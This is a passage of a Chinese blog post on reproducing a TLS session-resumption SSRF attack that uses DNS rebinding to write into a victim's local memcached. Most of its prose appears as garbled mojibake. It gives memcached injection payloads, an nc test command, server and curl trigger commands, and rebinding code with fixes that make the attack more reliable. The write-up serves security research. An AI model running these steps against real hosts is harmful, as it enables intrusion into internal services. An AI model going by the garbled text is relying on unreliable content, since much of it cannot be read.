å‘½ä»¤çš„ç¬¬ä¸‰ä¸ªæ•°å­—å‚æ•°ï¼Œè¯¥å‚æ•°ä¸ºè®¾ç½®æ•°æ®çš„é•¿åº¦ï¼Œå¦åˆ™ä¹Ÿä¼šå‘ç”Ÿé”™è¯¯å†™ä¸è¿› memcahedï¼Œæ¯”å¦‚i in ur cacheè¿™é‡Œæ˜¯ 13 ä¸ªå­—èŠ‚ï¼Œå‰é¢çš„ç¬¬ä¸‰ä¸ªæ•°å­—å‚æ•°å°±éœ€è¦ä¸º 13 ï¼›å‰é¢çš„å‘½ä»¤ä¸æ•°æ®é—´çš„æ¢è¡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ LF ä½œä¸ºæ¢è¡Œï¼Œå¯ä»¥èŠ‚çœä¸€ä¸ªå­—èŠ‚é•¿åº¦ã€‚ è¿™é‡Œå»ºè®®å…ˆä½¿ç”¨echo -e \u0026quot;\\r\\nset foo 0 0 13\\ni in ur cache\\r\\n\u0026quot;|nc 127.0.0.1 11211æ¥å°è¯•è‡ªå·±çš„ pyaload æ˜¯å¦èƒ½å¤Ÿå†™å…¥ memcached ï¼Œè¿™æ ·å¦‚æœåé¢å¤±è´¥äº†ï¼Œå¯¹åé¢çš„æ’é”™å¾ˆæœ‰ç”¨ï¼è‡³å°‘èƒ½æ’é™¤ä¸€ä¸ªå¯èƒ½å­˜åœ¨çš„é—®é¢˜ï¼     åœ¨åŸä½œè€…çš„æ–¹æ³•ä¸­ï¼Œä¸ºäº†è®© TLS è¿›è¡Œ Session Resumption ï¼Œä½œè€…ä½¿ç”¨äº† HTTP 301 è·³è½¬çš„æ–¹å¼è®© TLS è¿›è¡Œæ¢å¤ä¼šè¯ï¼Œè€Œè·³è½¬çš„åœ°å€åˆ™ä¹Ÿéœ€è¦æˆ‘ä»¬é€šè¿‡ redis æ¥è®¾ç½®ï¼Œè®¾ç½®çš„ key ä¸º redirect ï¼Œä»¥ example.com ä¸¾ä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·è¿›è¡Œè®¾ç½®ï¼šset redirect \u0026quot;https://tls.example.com:11211/\u0026quot;  ã€‚ï¼ˆè¿™é‡Œæ˜¯åŸä½œè€…æ²¡æœ‰åœ¨æ–‡æ¡£ä¸­åšå‡ºè¯´æ˜çš„åœ°æ–¹ï¼Œå¾—éœ€è¦é˜…è¯» main.rs ä»£ç æ‰èƒ½çœ‹å‡ºæ¥ï¼‰ è¿˜æœ‰ä¸€ç‚¹å°±æ˜¯ä½œè€…è¿˜æä¾›äº†ä¸€ä¸ªå»¶è¿Ÿçš„é€‰é¡¹ï¼Œä»¥å…è¯·æ±‚è¿‡å¿«ï¼ˆè¿™é‡Œæœ‰ä¸€äº›å…¶ä»–åŸå› åœ¨æ­¤å¤„ï¼Œåç»­æˆ‘ä»¬ä¼šåˆ†æåˆ°ï¼‰ã€‚æˆ‘ä»¬è¿˜æ˜¯å¯ä»¥é€šè¿‡ redis æ¥è®¾ç½® sleep è¿™ä¸ªå‚æ•°ï¼Œå¯ä»¥è¾¾åˆ°å»¶è¿Ÿå¤šå°‘ ms çš„æ•ˆæœï¼Œå¦‚æœä¸è®¾ç½®çš„è¯ï¼Œé»˜è®¤å€¼ä¸º 2000 ms ï¼Œä¸€èˆ¬è¿™ä¸ªæ•°å€¼å°±å¯ä»¥äº†ã€‚  æˆ‘ä»¬è¿™é‡Œä»¥æ”»å‡»æœ¬åœ°çš„ memcached ä¸ºä¾‹ï¼Œåœ¨ ubuntu 20.04 LTS ä¸Šé»˜è®¤ä½¿ç”¨apt install memcachedå®‰è£…å®Œæˆä¹‹åï¼Œå…¶é»˜è®¤ç›‘å¬åœ¨ 11211 ç«¯å£ä¸Šã€‚ä¹‹åæˆ‘ä»¬æŒ‰ç…§ä½œè€…çš„è¯´æ˜ï¼Œåœ¨ TLS VPS ä¸Šè¿è¡Œ TLSServer ï¼š\ntarget/debug/custom-tls -p 11211 --verbose --certs /path/to/fullchain.pem --key /path/to/privkey.pem http å¥½äº†ï¼Œç°åœ¨æ‰ç»ˆäºæ˜¯ä¸€åˆ‡å‡†å¤‡å°±ç»ªäº†ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥ä½¿ç”¨ curl è¿›è¡Œæµ‹è¯•äº†ã€‚è¿™é‡Œä¸ºäº†ç›´è§‚æŸ¥çœ‹ TLS Session Resumption çš„æ•ˆæœï¼Œæˆ‘ä»¬å¯ä»¥æ‰“å¼€ä¸¤ä¸ª wireshark æ¥è§‚å¯Ÿï¼Œä¸€ä¸ª wireshark ç›‘å¬åœ¨ä½ å¯¹å¤–é€šä¿¡çš„ç½‘ç»œæ¥å£ä¸Šï¼Œä¸€ä¸ª wireshark ç›‘å¬åœ¨æœ¬åœ°å›ç¯æ¥å£ä¸Šã€‚è¿è¡Œä¸€ä¸‹å‘½ä»¤è®¿é—®ä½ çš„ TLSServer ï¼š\ncurl https://tls.example.com:11211/ -Lv PS: æ³¨æ„è¿™é‡Œéœ€è¦åŠ ä¸Š-Lå‚æ•°å…è®¸ curl è¿›è¡Œé‡å®šå‘ã€‚\næ¥ç€å¦‚æœç¬¬ä¸€æ¬¡ DNS å°±æŠŠæˆ‘ä»¬çš„åŸŸåè§£æåˆ° 127.0.0.1çš„è¯ï¼Œå¯ä»¥å¤šè¯•å‡ æ¬¡ç›´åˆ°åŸŸåè§£æåˆ°ä½ çš„ TLS VPS IP ä¸Šä¸ºæ­¢ï¼Œç„¶åç­‰å¾… 1 min å·¦å³ï¼Œå¦‚æœç½‘ç»œé¡ºç•…ï¼Œä¸€åˆ‡é¡ºåˆ©çš„è¯ï¼Œåœ¨ 1min å·¦å³å°±å¯ä»¥å®Œæˆæœ¬æ¬¡æ”»å‡»ã€‚æ”»å‡»æ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\n \nå…¶ä¸­å¯èƒ½ä¼šäº§ç”Ÿå‡ ç§ç»“æœ\n ç¬¬ä¸€ç§æœ€å¸¸è§çš„ç»“æœå°±æ˜¯curl: (47) Maximum (50) redirects followedï¼Œè¡¨ç¤ºé‡å®šå‘æ¬¡æ•°å·²ç»è¶…è¿‡äº† curl é»˜è®¤çš„æœ€å¤§æ·±åº¦ 50 æ¬¡ï¼Œè¯´æ˜ DNS Rebinding æ²¡æœ‰å°† 127.0.0.1 è¿”å›åˆ°ç»™ Client ï¼Œè¿™é‡Œå› ç´ ä¹Ÿæ¯”è¾ƒå¤šï¼Œåæ–‡ä¼šæåˆ°ï¼Œå¯ä»¥è¯´è¿æ°”æ¯”è¾ƒå·®ï¼Œå¤šè¯•å‡ æ¬¡å°±è¡Œäº†ã€‚ ç¬¬äºŒç§ç»“æœæ˜¯curl: (35) error:1408F10B:SSL routines:ssl3_get_record:wrong version numberï¼Œå¦‚æœä¸Šé¢çš„ä¿¡æ¯ä½ è¿˜çœ‹åˆ°äº†Trying 127.0.0.1ï¼Œé‚£ä¹ˆæ­å–œä½ ï¼Œå¾ˆæœ‰å¯èƒ½è¿™æ¬¡å°±æˆåŠŸäº†ï¼Œèµ¶ç´§å» memcached çœ‹çœ‹å§  The Details OF Original Method åœ¨æ•´ç†è¿™ç¯‡æ–‡ç« ä¹‹å‰ï¼Œæˆ‘ä¹Ÿå‚è€ƒäº†å¾ˆå¤šæ–‡ç« ï¼Œè™½ç„¶è¿™äº›æ–‡ç« æ²¡æœ‰æ˜ç¡®çš„è¯´æ˜è¿™ä¸ªæ”»å‡»çš„æ”»å‡»è½½ä½“ï¼Œä¹Ÿå°±æ˜¯ Payload æœ€å¤§é•¿åº¦æ˜¯ 32 å­—èŠ‚ï¼Œä½†æ˜¯éƒ½ç»™äº†è®©æˆ‘äº§ç”Ÿäº†ä¸€ç§å…ˆå…¥ä¸ºä¸»çš„æ¦‚å¿µï¼Œåœ¨æˆ‘å°è±¡å½“ä¸­å®ƒå°±åªå±€é™äº 32 å­—èŠ‚ï¼Œç„¶åæˆ‘å»è¯¦ç»†å»çœ‹ä½œè€…å…¬å¼€çš„ PDF æ—¶ï¼Œå‘ç°ä½œè€…åœ¨æ¼”ç¤ºæ”»å‡» SMTP æ—¶æœ‰ä¸€ä¸ªå›¾æ˜¯è¿™æ ·çš„ï¼š\n \nå…¶ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸ª payload å·²ç»è¿œè¿œè¶…è¿‡äº† 32 å­—èŠ‚ï¼Œç„¶åæˆ‘æŠ±ç€ç–‘æƒ‘å»åå¤æŸ¥çœ‹ä½œè€…å…¬å¸ƒçš„æ¼”è®²å½•åƒï¼Œå…¶ä¸­ä»–æœ‰è¿™ä¹ˆè¯´åˆ°ï¼ˆä½†æ„¿æˆ‘çš„è‹±è¯­å¬åŠ›ä»¥åŠ Youtube å­—å¹•è¶³å¤Ÿå‡†ç¡®ï¼‰ï¼š\n â€‹\tIt might seem too good to be ture but TLS actually provides us exactly that in the form of a session id. Most clients even persist this field for later use. Session ids are limited to 32 bytes as you can see but depending on the implementation you might have session ticket. This one is about 200 bytes but these can be up to around 65 kilobytes. But session ids and session tickets are mechanisms for a TLS client to go. Remember that cryptographic key exchange we did earlier let\u0026rsquo;s just keep using that key in this new connection. TLS 1.3 includes a slightly more complicated but similar mechanism called a pre-shared key identity which pretty much does the smae thing for our purposes. All of these are about optimization since key exchange can be time consuming. But they provide a certain way for a server to tell whatever is connecting to it to persist some data for lighter use, almost like a cookie that lives in plain text. So it\u0026rsquo;s perfect for the surf attack we\u0026rsquo;re trying to do.\n ä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªæ”»å‡»æœ¬æ¥å°±å¯ä»¥åšåˆ°è¶…è¿‡ 32 å­—èŠ‚çš„åšæ³•ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¹‹å‰æ‰€è¯´çš„é‚£å‡ ç§ Session Resumption ï¼Œåªæœ‰ SessionID å±€é™äº 32 å­—èŠ‚ä»¥ä¸‹ã€‚\nå¹¶ä¸”æŒ‰ç…§ä¸Šé¢æˆ‘ä»¬çš„å®éªŒç»“æœå…¶ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒæŒ‰ç…§åŸæ¥ä½œè€…åœ¨å…¶ä»“åº“ README æè¿°çš„æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥ä»å®è·µä¸­çœ‹å‡ºå¦‚ä¸‹å‡ ä¸ªç‚¹ï¼š\n åŒæ–¹é»˜è®¤ä½¿ç”¨ TLS 1.3 è¿›è¡Œæ¡æ‰‹æ•°æ®äº¤äº’ï¼Œå½“ç„¶è¿™é‡Œéœ€è¦ä½ çš„ curl æ”¯æŒ TLS 1.3 TLS 1.3 ä½¿ç”¨ PSK è¿›è¡Œ Session Resumption PSK åé¢è¿˜åŒ…å«äº†å¾ˆå¤šä¸ª 0x00 ï¼Œæ€»é•¿åº¦è¿œè¿œè¶…è¿‡äº† 32 å­—èŠ‚  æ‰€ä»¥ä½œè€…åŸä»“åº“å®ç°çš„æ˜¯åŸºäº TLS 1.3 çš„ Session Resumption ï¼Œåé¢æˆ‘ä»¬å…·ä½“çœ‹å…¶å®ç°ä»£ç å‘ç°ä¹Ÿç¡®æ˜¯å¦‚æ­¤ï¼Œä½œè€…åªå®ç°äº†åŸºäº PSK çš„ä¼šè¯æ¢å¤ SSRF ï¼Œå…¶ä»–å‡ ç±»éƒ½æ²¡æœ‰å®ç°ã€‚\næ‰€ä»¥ï¼Œæ„Ÿè§‰ä¸€åˆ‡éƒ½æœ‰äº›æ˜æœ—äº†ï¼Œé‚£æˆ‘ä»¬å†æ¥å°è¯•ä¸€ä¸‹è¶…è¶Š 32 å­—èŠ‚çš„ payload ï¼Œçœ‹çœ‹åˆ°åº•èƒ½ä¸èƒ½å®ç°ã€‚ä¾æ—§æŒ‰ç…§å¦‚ä¸Šçš„æµç¨‹åšå¥½ setup ï¼Œåªä¸è¿‡ä¸åŒçš„æ˜¯æˆ‘ä»¬éœ€è¦åœ¨ TLS VPS çš„ redis ä¸Šä¿®æ”¹ä¸€ä¸‹ payload ï¼Œè¿™æ¬¡æˆ‘ä»¬éšæ„ä¿®æ”¹ä¸€ä¸‹ï¼Œåªè¦å¤Ÿé•¿å°±å¥½ï¼Œè¿™é‡Œä¸€å®šè¦æ³¨æ„æŠŠè¦å‘ç»™ memcached çš„ payload å½“ä¸­çš„setæŒ‡ä»¤çš„ç¬¬ä¸‰ä¸ªå‚æ•°ä¿®æ”¹æˆå…¶ value çš„é•¿åº¦ï¼Œæ¯”å¦‚è¯´æˆ‘ä»¬è¿™é‡Œä¿®æ”¹ payload ä¸ºï¼šset payload \u0026quot;\\r\\nset foo 0 0 79\\nThis time I'm really in your cache and I can write what I want into your cache.\\r\\n\u0026quot;ã€‚ï¼ˆå½“ç„¶è¿˜æ˜¯å»ºè®®åœ¨å®éªŒä¹‹å‰ä½¿ç”¨ä¹‹å‰çš„æ–¹æ³•æµ‹è¯•ä¸€ä¸‹è‡ªå·±çš„ payload èƒ½å¦å†™å…¥åˆ° memcached å½“ä¸­ï¼‰\nOk. Here we go.\n \nå½“å½“ï¼Œæˆ‘ä»¬å·²ç»å¯ä»¥å†™å…¥è¶…è¿‡ 32 å­—èŠ‚çš„æ•°æ®å•¦ï¼\nThe Bad Code IN Original Method ç»è¿‡ä¸Šè¿°ä¸¤ä¸ªå®éªŒï¼Œæˆ‘å·²ç»çŒœåˆ°å¯èƒ½å¤§å¤šæ•°åŒå­¦çš„å®éªŒå¹¶ä¸æ˜¯ä¸€æ¬¡éƒ½æˆåŠŸï¼Œå¾ˆå¤šäººå¯èƒ½éƒ½æ˜¯å¾—åˆ°ç¬¬ä¸€ç§ç»“æœï¼Œä¹Ÿå°±æ˜¯è¶…è¿‡äº† curl æœ€å¤šé‡å®šå‘æ¬¡æ•°è€Œå¤±è´¥ï¼Œè€Œå¯¼è‡´è¿™ä¸ªç»“æœçš„åŸå› ä¸€èˆ¬æ¥è¯´å°±æ˜¯ DNS Rebinding å¤±è´¥ï¼Œæ²¡æœ‰åœ¨ç¬¬äºŒæ¬¡ DNS æŸ¥è¯¢çš„æ—¶å€™è¿”å› 127.0.0.1 ï¼Œè¿™æ ·ä¸€ç›´åœ¨ä¸ TLSServer è¿›è¡Œé€šä¿¡å¯¼è‡´æœ€åé‡å®šå‘æ¬¡æ•°è¿‡å¤šè€Œå¤±è´¥ã€‚\nè®©æˆ‘ä»¬ç®€å•çœ‹çœ‹ä½œè€…çš„ DNS Rebinding æ€ä¹ˆå†™çš„ï¼Œæˆ‘ä»¬é‡ç‚¹å…³æ³¨ä»¥ä¸‹ä»£ç ï¼š\nspoof_count = 0 start = time() last_ip = None def get_spoofed_IP(domain, ip): global spoof_count global start global last_ip start = time() last_ip = ip for d in HOSTS_LIST: if re.match(d[0], domain.lower()) or True: spoof_count = (spoof_count + 1) % 3 # The below line will result in the answer switching after 30 seconds, # instead of alternating # return d[1] if (time() - start \u0026gt; 30) else args.TARGET return d[1] if spoof_count == 0 else args.TARGET return None è¿™æ˜¯ä½œè€…è‡ªå·±å†™çš„ä»£ç ï¼Œè¿™æ®µä»£ç çš„æ„æ€å¤§æ¦‚å°±æ˜¯é€šè¿‡è®°å½• DNS æŸ¥è¯¢çš„æ€»æ¬¡æ•°ï¼Œå¦‚æœæŸ¥è¯¢æ€»æ¬¡æ•°æ¨¡ 3 ä¸º 0 çš„è¯ï¼Œä¹Ÿå°±æ˜¯ 3 çš„å€æ•°ï¼Œè¿”å›d[1]ï¼Œä¹Ÿå°±æ˜¯ 127.0.0.1 ï¼Œå¦åˆ™å°±è¿”å›æˆ‘ä»¬çš„ TLS VPS IP ã€‚è¿™ç§æ–¹å¼æˆ‘ä»¬æš‚ä¸”ä¸è°ˆï¼Œå…ˆä¸å…³æ³¨ã€‚\næˆ‘ä»¬å†æ¥çœ‹çœ‹å…¶æ³¨é‡Šçš„æ–¹å¼ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ³¨é‡Šå½“ä¸­çš„æ–¹å¼ï¼ŒDNS Server å¯åŠ¨ 30s ä¹‹å‰è¿”å› TLS VPS IP ï¼Œåªéœ€è¦åœ¨ 30s ä¹‹åï¼Œ DNS å°±ä¼šä¸€ç›´è¿”å›æˆ‘ä»¬çš„ç›®æ ‡åœ°å€ 127.0.0.1 ã€‚\næˆ‘ä»¬ç°åœ¨å…ˆæ¥å—ä¸€ä¸ªç»“è®ºï¼Œå°±æ˜¯ curl å¯¹äºä¸€ä¸ªåŸŸåæœ‰ä¸€å®šçš„ DNS ç¼“å­˜æ—¶é—´ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬æƒ³è®© curl ç¬¬ä¸€æ¬¡ DNS æŸ¥è¯¢å¾—åˆ° TLS VPS IP ï¼Œåœ¨ç¼“å­˜æ—¶é—´ç»“æŸä¹‹åæŸ¥è¯¢çš„ç»“æœè¿”å› 127.0.0.1 ï¼Œé‚£ä¹ˆæ³¨é‡Šå½“ä¸­çš„æ–¹å¼æ˜¯æœ€å¥½ä¸è¿‡çš„äº†ã€‚\nå¥½äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å…¬å¼€å¤„åˆ‘ï¼ˆæˆ‘ä¹Ÿä¸çŸ¥é“ä½œè€…æ˜¯ä¸æ˜¯ç²—å¿ƒå¤§æ„å†™å‡ºè¿™æ ·çš„ä»£ç ï¼‰ï¼š\nspoof_count = 0 start = time() last_ip = None def get_spoofed_IP(domain, ip): global spoof_count global start global last_ip start = time() last_ip = ip for d in HOSTS_LIST: if re.match(d[0], domain.lower()) or True: spoof_count = (spoof_count + 1) % 3 # The below line will result in the answer switching after 30 seconds, # instead of alternating return d[1] if (time() - start \u0026gt; 30) else args.TARGET return None è®©æˆ‘ä»¬å†æ¥å›é¡¾è¿™æ®µä»£ç ï¼šå—¯ï¼Œå†™çš„éå¸¸çš„æ£’ï¼Œç”¨time()è®¡æ—¶ï¼Œè¶…è¿‡ 30s å°±è¿”å›ç›®æ ‡ IP ï¼Œå¤ªå¯¹äº†å“¥ã€‚å¦‚æœè¿˜æ²¡çœ‹å‡ºæ¥çš„åŒå­¦ï¼Œæˆ‘å†ç®€åŒ–ä¸€ä¸‹ï¼š\nspoof_count = 0 start = time() last_ip = None def get_spoofed_IP(domain, ip): global spoof_count global start global last_ip start = time() if time() - start \u0026gt; 30: return d[1] else: return args.TARGET æˆ‘è§‰å¾—åªè¦ä½ çš„æœºå™¨ç¨å¾®æ­£å¸¸ä¸€ç‚¹ï¼Œæ­£å¸¸æ‰§è¡Œå‡ è¡Œèµ‹å€¼è¯­å¥çš„ python ä»£ç çš„é€Ÿåº¦åº”è¯¥ä¸ä¼šè¶…è¿‡ 30s å§ï¼Ÿè¿™ä¸ªåœ¨ä½¿ç”¨time()å‡½æ•°å¯¹startå˜é‡èµ‹å€¼ä¹‹åï¼Œåˆä½¿ç”¨äº†time()å‡½æ•°è·å–æ—¶é—´æˆ³ä¸startå˜é‡ç›¸å‡ã€‚å•Šè¿™ï¼Œåæ­£æˆ‘çš„æœºå™¨æ˜¯å‡ä¸å‡º 30s ï¼Œè¿™æ®µä»£ç å°±è®©æˆ‘æ„Ÿè§‰åˆ°ä½œè€…å†™çš„éå¸¸çš„ç¦»è°±\u0026hellip;å½“ç„¶è¿™é‡Œçº¯å±ä¸ªäººåæ§½ï¼Œè¿™é‡Œæˆ‘ä»¬åªéœ€è¦æŠŠå‡½æ•°å†…å¯¹äºstartå˜é‡å†æ¬¡èµ‹å€¼çš„æ“ä½œåˆ é™¤å°±è¡Œäº†ï¼Œè¿™æ ·startå¾—åˆ°çš„æ—¶é—´å°±æ˜¯ç¨‹åºå¯åŠ¨çš„æ—¶é—´äº†ã€‚ï¼ˆé™¤éæˆ‘å“ªé‡Œè¯¯è§£äº†è¿™æ®µä»£ç ï¼‰\nå½“ç„¶æˆ‘å»ºè®®æ—¶é—´é—´éš”åœ¨ 10s è¿™æ ·å°±è¡Œï¼Œè¿™æ ·å°±èƒ½æ¯”è¾ƒç²¾å‡†çš„è®© curl åœ¨ç¬¬äºŒæ¬¡ DNS æŸ¥è¯¢çš„æ—¶å€™æ‹¿åˆ° 127.0.0.1 çš„å“åº”äº†ã€‚ï¼ˆä¸€åªé»„è‰²çš„å“†å•¦Aæ¢¦ï¼šè¿™äººä¹Ÿå¤ªèœäº†.jpg\nå½“ç„¶ï¼Œæˆ–è€…ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨æ€»æ¬¡æ•°çš„æ–¹å¼ï¼Œå¦‚æœæ€»æ¬¡æ•°è¶…è¿‡ä¸€æ¬¡ç«‹å³è¿”å› 127.0.0.1 ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œä¸è¿‡ä¸‡ä¸€è¢«åˆ«äººæŸ¥äº†ç¬¬ä¸€æ¬¡å°±å°´å°¬äº†ï¼Œä½†æ˜¯ä¸€èˆ¬æ¥è¯´ä¸ä¼šã€‚\nThe Optimization Method OF DNS Rebinding å°±åƒæˆ‘ä»¬ä¸Šæ–‡æ‰€æåˆ°çš„ï¼Œè¿™ä¸ªæ”»å‡»ä¸»è¦å–å†³äºä¸¤ä¸ªç‚¹ï¼Œä¸€ä¸ªæ˜¯ TLS Session Resumption ï¼Œå¦ä¸€ä¸ªå°±æ˜¯ DNS Rebinding ã€‚ä¸€ä¸ªå¥½çš„ DNS Rebinding å¯ä»¥èµ·åˆ°äº‹åŠåŠŸå€çš„æ•ˆæœã€‚\næˆ‘è¯¢é—®äº†ä¸€äº› CTFer ï¼Œä¹ŸæŸ¥è¯äº†ä¸€äº› DNS Rebinding çš„å·¥å…·ï¼Œè¯¸å¦‚ rbndr / ceye ç­‰æ¯”è¾ƒå¸¸ç”¨çš„å·¥å…·ï¼Œä¸€èˆ¬ç»Ÿä¸€åšæ³•éƒ½æ˜¯æ¯æ¬¡è¿”å›ä¸€ä¸ª TTL è¾ƒå°çš„ A è®°å½•ï¼Œåªä¸è¿‡æ¯æ¬¡è¿”å›çš„è®°å½•ä¸åŒï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯åœ¨ç”¨æˆ·æŒ‡å®šçš„ A è®°å½•å½“ä¸­éšæœºæ¦‚ç‡è¿”å›ä¸€ä¸ªã€‚è¿™æ ·å¦‚æœä½¿ç”¨è¿™äº› DNS Rebinding å·¥å…·åœ¨è¿™é‡Œå°±ä¸æ˜¯ä¸€ä¸ªéå¸¸å¥½çš„é€‰æ‹©ã€‚\néšåï¼Œ@zhaojin åœ¨ åŸºäº A å’Œ AAAA è®°å½•çš„ä¸€ç§æ–° DNS Rebinding å§¿åŠ¿â€“ä»è¥¿æ¹–è®ºå‰‘2020 Web HelloDiscuzQ é¢˜å¯¹ Blackhat ä¸Šçš„è®®é¢˜åšå‡å æåˆ°æ–°çš„æ–¹æ³•ï¼Œä¼¼ä¹å¯ä»¥ä½¿ç”¨ä¸€ä¸ªåŸŸååŒæ—¶åˆ†é…ä¸€ä¸ª A è®°å½•è·Ÿä¸€ä¸ª AAAA è®°å½•ï¼Œå› ä¸º curl ä¼šä¼˜å…ˆä½¿ç”¨ AAAA è®°å½•ï¼Œè€Œå½“ AAAA è®°å½•çš„ IPv6 æ— æ³•å»ºç«‹è¿æ¥æ—¶ï¼Œä¼šå°è¯•è·Ÿ A è®°å½•çš„ IPv4 è¿›è¡Œå»ºç«‹è¿æ¥ã€‚æˆ‘è§‰å¾—æ˜¯ä¸ªå¾ˆæœ‰è¶£çš„æƒ³æ³•ï¼Œæ•´ä¸ªæ€è·¯å¤§è‡´å¦‚ä¸‹ï¼š\n ç¬¬ä¸€æ¬¡è®© curl å»è®¿é—®æ¶æ„çš„ HTTPS æœåŠ¡å™¨ï¼Œæ‹¿åˆ°ä¸€ä¸ªæ¶æ„çš„ SessionID ç„¶åä½¿æ¶æ„çš„ HTTPS æœåŠ¡å™¨æ— æ³•æ¥æ”¶æ–°çš„è¿æ¥ è¿™æ—¶æ¶æ„çš„ HTTPS ç»™å‡ºç¬¬ä¸€æ¬¡è¿”å›çš„ç»“æœï¼Œä½¿å…¶è¿›è¡ŒåŒåŸŸåè·³è½¬ è·³è½¬æ—¶ä¼šå°è¯•è¿›è¡Œæ–°è¿æ¥ï¼Œå‘ç°æ¶æ„çš„ HTTPS æœåŠ¡å™¨æ— æ³•è¿æ¥ã€‚ åˆ™ä¼šå°è¯•è¿æ¥è¿™ä¸ªåŸŸåä¸‹çš„å…¶ä»–è®°å½•æ‰€æŒ‡å‘çš„åœ°å€ï¼Œå¹¶å¸¦ä¸Š SessionID   â€‹\tåœ¨ CURL ä¸­ï¼Œå¯¹äºä¸€ä¸ªåŸŸåï¼Œå¦‚æœåŒæ—¶å…·æœ‰ A è®°å½•å’Œ AAAA è®°å½•ï¼Œé‚£ä¹ˆ CURL ä¼šå»ä¼˜å…ˆè¯·æ±‚ AAAA æˆ–è€… A è®°å½•æ‰€æŒ‡å‘çš„åœ°å€ï¼Œå¦‚æœè¿™äº›åœ°å€æ— æ³•è¿æ¥ï¼Œåˆ™ä¼šå°è¯•è¿æ¥åŒæ—¶å¾—åˆ°çš„ A è®°å½•æˆ–è€… AAAA è®°å½•ã€‚\nåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä¼šå‡ºç°ï¼š\nAAAA è®°å½•åœ°å€ä¸é€šï¼Œä¼šè¿æ¥åˆ° A è®°å½•åœ°å€ä¸Šã€‚\nAè®°å½•åœ°å€ä¸é€šï¼Œä¼šè¿æ¥åˆ° AAAA è®°å½•åœ°å€ä¸Šã€‚\n  \nä½†æ˜¯æ¯”è¾ƒé—æ†¾çš„æ˜¯ï¼Œå¦‚æœå¯¹äºä¸€ä¸ªåŸŸåè¿›è¡Œè¿™æ ·çš„è®¾ç½®ï¼ŒAAAA è®°å½•æŒ‡å‘ TLS VPS çš„ IPv6 åœ°å€ä¸Šï¼ŒA è®°å½•æŒ‡å‘ 127.0.0.1 åœ°å€ï¼Œå®é™…æµ‹è¯• å½“ä¸­ï¼Œ curl æ€»æ˜¯ä¼˜å…ˆ 127.0.0.1 ï¼Œå¹¶ä¸”æ²¡æœ‰éšæœºçš„åšæ³•ï¼›å¦‚æœå¯¹äºä¸€ä¸ªåŸŸåè¿›è¡Œè¿™æ ·çš„è®¾ç½®ï¼ŒAAAA è®°å½•æŒ‡å‘ ::1 åœ°å€ä¸Šï¼ŒA è®°å½•æŒ‡å‘ TLS VPS çš„ IPv4 åœ°å€ä¸Šï¼Œcurl æ€»æ˜¯ä¼˜å…ˆ ::1\n{% colorquote success %}\n2021/05/14 æ›´æ–°ï¼š\næ„Ÿè°¢ @chuye æŒ‡å‡ºæ­¤å¤„é”™è¯¯ï¼ŒåŸæ–‡å·²æ›´æ­£ã€‚\nä¹‹å‰çš„é”™è¯¯ï¼š\nå¦‚æœå¯¹äºä¸€ä¸ªåŸŸåè¿›è¡Œè¿™æ ·çš„è®¾ç½®ï¼ŒAAAA è®°å½•æŒ‡å‘ ::ffff:127.0.0.1 æˆ–è€… ::1 åœ°å€ä¸Šï¼ŒA è®°å½•æŒ‡å‘ TLS VPS çš„ IPv4 åœ°å€ä¸Šï¼Œè™½ç„¶ä¼¼ä¹å¯ä»¥åšåˆ° curl å› ä¼˜å…ˆ AAAA è®°å½•ä¸ TLS VPS å»ºç«‹è¿æ¥è·å¾—æ¶æ„ Session ID ï¼Œä½†æ˜¯å®é™…æµ‹è¯•é»˜è®¤ memcached é…ç½®ï¼Œæ— æ³•é€šè¿‡è¿™ä¸¤ä¸ª(::ffff:127.0.0.1 æˆ–è€… ::1)åœ°å€è¿›è¡Œå†™å…¥ memcached ã€‚\næ›´æ­£ï¼šcurl ä»¥ ::1 ä¼˜å…ˆï¼Œè€Œä¸”åŸæ¥çš„è¯­åºäº§ç”Ÿäº†é”™è¯¯ã€‚ä»¥åŠ Memcached å®é™…ä¸Šæ˜¯æ¥å—ä» ::ffff:127.0.0.1 æˆ–è€… ::1 å†™å…¥çš„ï¼Œè¯¦è§ Additional Remarks\n{% endcolorquote %}\nè™½ç„¶æœ‰äº›é—æ†¾æ— æ³•å¤ç° @zhaojin æ‰€è¯´çš„è¿™ä¸ªæ–¹æ³•ï¼Œä½†æ˜¯æˆ‘è§‰å¾—æ˜¯ä¸ªå¾ˆæœ‰è¶£çš„æƒ³æ³•ï¼Œä»¥åŠ @Ivan Komarov æåˆ° DNS å¯¹äºä¸€ä¸ªåŸŸåå¯ä»¥è¿”å›åŒ A è®°å½•ï¼Œä¹Ÿèƒ½æœ‰ç±»ä¼¼çš„æ•ˆæœï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¿™æ ·è¿›è¡Œå°è¯•ï¼š\n é¦–å…ˆï¼Œé»˜è®¤é…ç½®ä¸‹ï¼Œ æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ 0.0.0.0:11211 è¿™ä¸ªåœ°å€ä¸ memcached é€šä¿¡ å¯¹äºè¿”å›çš„åŒ A è®°å½•ï¼Œä¸€ä¸ªé…ç½®ä¸º TLS VPS IP ï¼Œå¦ä¸€ä¸ªä¸º 0.0.0.0 ï¼Œcurl æ¯æ¬¡éƒ½ä¼šä¼˜å…ˆä½¿ç”¨ TLS VPS IP ï¼Œå¦‚æœä¸èƒ½é€šä¿¡æ‰ä¼šæ¥ç€ä½¿ç”¨ 0.0.0.0:11211   \né‚£æ ¹æ®å·²çŸ¥ä¿¡æ¯ï¼Œé‚£ä¹ˆä¸ä¸Šæ–‡çš„åšæ³•ç±»ä¼¼ï¼Œæˆ‘ä»¬æ˜¯ä¸æ˜¯ä¹Ÿå¯ä»¥è®© curl 